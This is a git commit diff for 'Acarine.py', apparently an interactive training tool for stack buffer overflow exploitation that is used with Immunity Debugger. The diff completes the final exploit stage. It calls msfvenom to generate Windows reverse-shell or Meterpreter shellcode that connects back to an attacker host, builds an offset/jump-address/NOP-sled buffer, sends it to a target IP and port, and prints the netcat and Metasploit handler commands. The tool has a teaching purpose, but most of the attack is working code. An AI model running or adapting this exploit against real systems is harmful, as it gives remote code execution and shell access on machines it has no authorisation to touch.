f26312732bdd0ec06135114fe7c1d4cda1c15267
vaarg <104344158+vaarg@users.noreply.github.com>
2022-05-23 21:20:36 +1000

    Update Acarine.py

--- Acarine.py
+++ Acarine.py
@@ -1,6 +1,6 @@
 #!/bin/python
 
-# Acarine v0.5.0
+# Acarine v1.0.1
 
 # Usage: 
     # Acarine.py -t [IP] -p [PORT]
@@ -9,8 +9,6 @@
     # It is to be used in conjunction with Immunity Debugger and Immunity's Mona module.
 # Dependencies:
     # Metasploit Framework Tools
-# Unfinished features in development:
-    # [5] Final Buffer Overflow Exploit
 # Pending Fixes:
     # Error message to be added if incorrect args entered in terminal.
 
@@ -207,12 +205,16 @@ This means we are on target and now we will move on to the finding Bad Character
 
 def badCharsCall():
     global badChars
+    global badCharsStatic
     badChars = r"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
+    badCharsStatic = badChars
     return badChars
 
 def badCharsExec(charInp):
     charsPrompt(charInp)
-    charsConvert(badChars)
+    load = charsConvert(badChars)
+    charsLoad = "A" * offset + "B" * 4 + load
+    bufferSend(charsLoad)
 
 def charsMod(charsResultInput):
     global badChars
@@ -230,23 +232,24 @@ def charsPrompt(charsResultInput):
         charsMod(charsResultInput)
 
 def charsConvert(charSend):
-    # if len(chars) ==  
     chars_chars_mod = charSend
     arr = chars_chars_mod.split("\\x")
     arr = "".join(
         chr(int(i,16))
         for i in arr if i
         )
-    if len(charSend) != 16:
-        charsLoad = "A" * offset + "B" * 4 + arr
-    else:
-        charsLoad = "A" * offset + arr
-        # print(jmpEndian)
-    bufferSend(charsLoad)
+    return arr
+
+def charsVar():
+    global badCharsVar
+    toRemove = badChars.split(r'\x')
+    toRemove = list(toRemove for toRemove in toRemove)
+    toCompare = badCharsStatic.split(r'\x')
+    toCompare = list(toCompare for toCompare in toCompare)
+    charsList = set(toCompare)-set(toRemove)
+    badCharsVar = r'\x' + r'\x'.join(charsList)
 
 def badCharsTest():
-    # global badChars
-    # badChars = r"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
     badCharsCall()
     ## Instructions/Intro - Explains BadChars
     print(f"""\n{color.BOLD}{color.UNDERLINE}[3] Finding Bad Characters:{color.END}\n
@@ -282,7 +285,7 @@ After making note of the bad character(s), make sure you {color.PURPLE}RE-LOAD a
         else:
             break
     print("\nNow that we have successfully discovered all the Bad Characters in the test program we will move onto Finding the Jump Point.\n")
-    print(badChars)
+    charsVar()
     jumpPointTest()
 
 # [4] Finding the Jump Point:
@@ -332,13 +335,12 @@ Now press {color.BOLD}F2{color.END} and click 'Yes'""")
 This sets our address as a {color.BOLD}Breakpoint{color.END}.""")
     next = input(f"\n{color.GREEN}When ready to send test payload press [ENTER]: {color.END}")
     menuCheck(next)
-    # jmpLoad = "A" * offset + jmpEndian
-    # bufferSend(jmpLoad)
-    # print()
-    charsConvert(jmpEndian)
-    print(f"""\nNow we should notice in the top left panel: 
+    load = charsConvert(jmpEndian)
+    charsLoad = "A" * offset + load
+    bufferSend(charsLoad)
+    print(f"""\nNow we should notice in the top right panel: 
 '{color.BOLD}EIP {color.CYAN}{cutAdd}{color.END}{color.BOLD} gatekeep.{cutAdd}{color.END}'
-\nAnd down in the top right we should see: 
+\nAnd down in the bottom left we should see: 
 '{color.BOLD}Breakpoint at gatekeep.{cutAdd}'{color.END}\n
 This means we are hitting our jump point successfully.\n
 We will now be moving onto crafting our final payload.\n""")
@@ -356,17 +358,124 @@ def badCharsEnter():
     badCharsCall()
     charsInput = input(f"{color.RED}\nNo bad characters detected from previous sections.{color.END}\n\n{color.GREEN}{color.GREEN}Enter bad characters seperated by spaces, OR press [ENTER] if target program has no bad characters: {color.END}")
     charsMod(charsInput)
+    charsVar()
+
+def jmpPointAvailable():
+    try:
+        jmpEndian
+    except NameError:
+        jmpPointEnter()
+
+def jmpPointEnter():
+    print(f"{color.RED}\nNo Jump Point detected from previous sections.{color.END}")
+    endianConvert()
+
+def localHostIP():
+    global LHOST
+    LHOST = input(f"\n{color.GREEN}Enter Local Host {color.BOLD}IP{color.END}{color.GREEN} for exploit connect back to (on your machine): {color.END}")
+    menuCheck(LHOST)
+    if len(LHOST) > 15 or len(LHOST) < 7:
+        print(f"\n{color.RED}Invalid IP entered!{color.END}")
+        localHostIP()
+    else:
+        return LHOST
+
+def localHostPort():
+    global LPORT
+    try:
+        LPORT = int(input(f"\n{color.GREEN}Enter Local Host {color.BOLD}PORT{color.END}{color.GREEN} for exploit connect back to (on your machine): {color.END}"))
+    except:
+        print(f"\n{color.RED}Invalid PORT entered!{color.END}")
+        localHostPort()
+
+def payloadType():
+    global payload
+    global pType
+    payloadInput = input(f"{color.GREEN}Enter payload type [N/M]: {color.END}")
+    menuCheck(payloadInput)
+    if payloadInput == "N" or payloadInput == "n":
+        print(f"\n{color.PURPLE}Netcat selected!{color.END}\n")  
+        cmd = rf'msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} EXITFUNC=thread -b "\x00{badCharsVar}" -f c'
+        msfvenomNC = subprocess.run(cmd, shell=True, capture_output=True)
+        payload = msfvenomNC.stdout
+        pType = "N"
+    elif payloadInput == "M" or payloadInput == "m":
+        print(f"\n{color.PURPLE}Meterpreter Selected!{color.END}\n")
+        cmd = rf'msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} EXITFUNC=thread -b "\x00{badCharsVar}" -f c'
+        msfvenomMet = subprocess.run(cmd, shell=True, capture_output=True)
+        payload = msfvenomMet.stdout
+        pType = "M"
+    else:
+        print(f"{color.RED}Invalid input!{color.END}")
+        payloadType()
+    payload = payload[24:-3]
+    payload = payload.decode('utf-8')
+    payload = payload.replace('"\n"',"")
+    payload = charsConvert(payload)
 
 def exploitBuffer():
-    print("Exploit Placeholder")
+    padding = 32 * "\x90"
+    print(f"""\n{color.BOLD}{color.UNDERLINE}[5] Final Buffer Overflow Exploit:{color.END}\n
+In this section we will craft our final payload for our Buffer Overflow exploit.
+This payload can either be received via Netcat or Metasploit's Meterpreter shell.""")
     offsetAvailble()
     badCharsAvailable()
-    sys.exit()
+    jmpPointAvailable()
+    localHostIP()
+    localHostPort()
+    print(f"""\nNow that we know the EIP, the Bad Characters & the Jump Point we can now craft our final payload!\n
+Choose payload type:
+    [{color.CYAN}N{color.END}] Netcat Reverse TCP Payload
+    [{color.CYAN}M{color.END}] Meterpreter Reverse TCP Payload\n""")
+    payloadType()
+    if pType == "N":
+        shell = "Netcat"
+        print(f"""Prior to this exploit executing, please open a terminal window and type in the following command to set up a Netcat listener:
+[*] '{color.YELLOW}nc -nlvp {LPORT}{color.END}'""")
+    elif pType == "M":
+        shell = "Meterpreter"
+        print(f"""Prior to this exploit executing, please open a terminal window and type in the following series of commands:
+    [1] '{color.YELLOW}msfconsole{color.END}'
+    [2] '{color.YELLOW}use exploit/multi/handler{color.END}'
+    [3] '{color.YELLOW}set payload windows/meterpreter/reverse_tcp{color.END}'
+    [4] '{color.YELLOW}set lhost {LHOST}{color.END}'
+    [5] '{color.YELLOW}set lport {LPORT}{color.END}'
+    [6] '{color.YELLOW}options{color.END}' (to make sure all settings are correct)
+    [7] '{color.YELLOW}run{color.END}'""")
+    jmpEndianCon = charsConvert(jmpEndian)
+    print(jmpEndianCon)
+    next = input(f"\n{color.GREEN}When ready to Continue to final check, press [ENTER]: {color.END}")
+    menuCheck(next)
+    print(f"""\n{color.BOLD}{color.UNDERLINE}Summary:{color.END}
+Attacker:
+    [*] Shell Type:                 {color.GREEN}{shell}{color.END}
+    [*] Local IP:                   {color.GREEN}{LHOST}{color.END}
+    [*] Local PORT:                 {color.GREEN}{LPORT}{color.END}
+Target:
+    [*] Target IP:                  {color.CYAN}{HOST}{color.END}
+    [*] Target PORT:                {color.CYAN}{PORT}{color.END}
+    [*] EIP Offset:                 {color.CYAN}{offset}{color.END}
+    [*] Bad Characters:             {color.CYAN}{badCharsVar}{color.END}
+    [*] Jump Point (Little Endian): {color.CYAN}{jmpEndian}{color.END}\n""")
+    next = input(f"{color.GREEN}When ready to send final exploit press [ENTER]: {color.END}")
+    menuCheck(next)
+    finalPayload = "A" * offset + jmpEndianCon + padding + payload
+    bufferSend(finalPayload)
+    if bufferSend == 0:
+        print(f"\nThe Buffer Overflow exploit have successfully executed and you should now have an active {shell} shell connected.\n")
+        next = input(f'\n{color.GREEN}Press [ENTER] to return to menu, or type "exit" to terminate program: {color.END}')
+        if next == "exit":
+            sys.exit()
+        else:
+            menu()
+    elif bufferSend == 1:
+        print(f"{color.RED}\nBuffer Overflow Exploit Failed to Send! Restarting section!{color.END}")
+        exploitBuffer()
 
 # [!] Main:
 
 parser = argparse.ArgumentParser()
-parser.add_argument('-t','-T','--target',help="target IP")#,default=socket.gethostname())
+parser.add_argument('-t','-T','--target', help="target IP")#,default=socket.gethostname())
 parser.add_argument('-p','-P','--port', help="target PORT", type=int)
 args = parser.parse_args()
 
